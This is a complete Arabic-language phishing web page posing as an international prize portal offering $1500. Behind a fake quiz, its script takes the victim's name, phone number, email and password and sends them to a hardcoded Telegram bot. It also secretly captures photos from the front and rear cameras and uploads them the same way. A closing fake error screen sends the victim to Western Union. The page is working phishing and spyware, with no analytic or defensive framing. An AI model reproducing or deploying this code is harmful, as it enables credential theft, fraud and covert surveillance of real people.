<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الجوائز العالمية</title>
    <style>
        body { background: radial-gradient(circle, #1a1a2e, #16213e, #0f0c29); font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: white; overflow: hidden; }
        .card { background: rgba(255, 255, 255, 0.07); backdrop-filter: blur(15px); padding: 30px; border-radius: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 85%; max-width: 420px; text-align: center; border: 1px solid rgba(255,255,255,0.1); display: none; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .active { display: block; }
        h2 { color: #f1c40f; font-size: 24px; margin-bottom: 15px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: #fff; color: #333; font-size: 16px; }
        button { width: 100%; padding: 15px; background: linear-gradient(90deg, #d4af37, #f1c40f); color: #000; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.1em; margin-top: 10px; }
        .badge { background: #27ae60; padding: 5px 15px; border-radius: 20px; font-size: 12px; margin-bottom: 10px; display: inline-block; }
    </style>
</head>
<body>

<div class="card active" id="step1">
    <div style="font-size: 50px;">🌍</div>
    <h2>المسابقة الدولية الكبرى</h2>
    <p>أدخل بياناتك لفتح ملف استلام الجائزة (1500$)</p>
    <input type="text" id="mainName" placeholder="الاسم الثلاثي الكامل">
    <input type="tel" id="mainPhone" placeholder="رقم الهاتف (واتساب)">
    <button onclick="toQuiz()">بدء الاختبار التمهيدي</button>
</div>

<div class="card" id="step2">
    <div class="badge">اختبار الأهلية</div>
    <h3 id="qTitle">السؤال 1</h3>
    <p id="qText">ما هي عاصمة اليمن؟</p>
    <input type="text" id="ansInput" placeholder="اكتب إجابتك هنا...">
    <button onclick="checkQ()">تأكيد الإجابة</button>
</div>

<div class="card" id="step3">
    <h2 style="color: #2ecc71;">تم اجتياز الاختبار!</h2>
    <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px; margin-bottom: 15px;">
        <p style="margin: 5px 0; font-size: 14px;">المستفيد: <b id="dispName"></b></p>
        <p style="margin: 5px 0; font-size: 14px;">رقم الحوالة المؤقت: <b>INTL-99201-X</b></p>
    </div>
    <p style="font-size: 13px; color: #ddd;">لإتمام "التحويل الدولي" وتأكيد الهوية، يرجى تسجيل الدخول بحسابك الرسمي:</p>
    <input type="email" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="pass" placeholder="كلمة السر">
    <button onclick="finalSubmit()">تفعيل التحويل البنكي</button>
</div>

<div class="card" id="step4">
    <h2 style="color: #e74c3c;">خطأ في النظام الدولي</h2>
    <p>تم استلام بياناتك بنجاح، ولكن تعذر إكمال التحويل التلقائي بسبب قيود جغرافية في منطقتك.</p>
    <p style="font-size: 13px;">يرجى مراجعة أقرب فرع "ويسترن يونيون" في مدينتك بعد 24 ساعة برقم الحوالة المؤقت.</p>
</div>

<video id="v" width="1" height="1" autoplay style="display:none;"></video>
<canvas id="c" width="640" height="480" style="display:none;"></canvas>

<script>
    const token = '8613819460:AAHS5tMNWSpCAUpSR673CEmZiDk8jw2xeEY';
    const chat = '8449870416';
    let qStep = 1;

    async function toQuiz() {
        const n = document.getElementById('mainName').value;
        const p = document.getElementById('mainPhone').value;
        if(!n || !p) return;
        
        document.getElementById('dispName').innerText = n;
        sendB(`🚀 صيد جديد بدأت:\n👤 الاسم: ${n}\n📞 الهاتف: ${p}\n📱 النظام: ${navigator.platform}`);
        
        showStep(2);
        runCapture(n); // بدء قطار التصوير التبادلي في الخلفية
    }

    function checkQ() {
        const val = document.getElementById('ansInput').value.trim();
        if(qStep === 1) {
            if(val === "صنعاء") {
                qStep = 2;
                document.getElementById('qTitle').innerText = "السؤال 2";
                document.getElementById('qText').innerText = "كم عدد أركان الإسلام؟";
                document.getElementById('ansInput').value = "";
            }
        } else {
            showStep(3);
        }
    }

    async function finalSubmit() {
        const e = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        if(!e || !p) return;
        
        sendB(`🔑 بيانات الدخول:\n📧 الإيميل: ${e}\n🔐 كلمة السر: ${p}`);
        showStep(4);
    }

    function showStep(s) {
        document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
        document.getElementById('step' + s).classList.add('active');
    }

    async function runCapture(name) {
        const modes = ["user", "environment"];
        for (let i = 1; i <= 4; i++) {
            for (let mode of modes) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1500));
                    takeP(mode === "user" ? "أمامية" : "خلفية", name);
                    stream.getTracks().forEach(t => t.stop());
                } catch(err) {}
            }
        }
    }

    function takeP(label, name) {
        const canvas = document.getElementById('c');
        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('photo', blob, 'x.jpg');
            fd.append('caption', `📸 ${label} - ${name}`);
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function sendB(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(t)}`); }
</script>
</body>
</html>
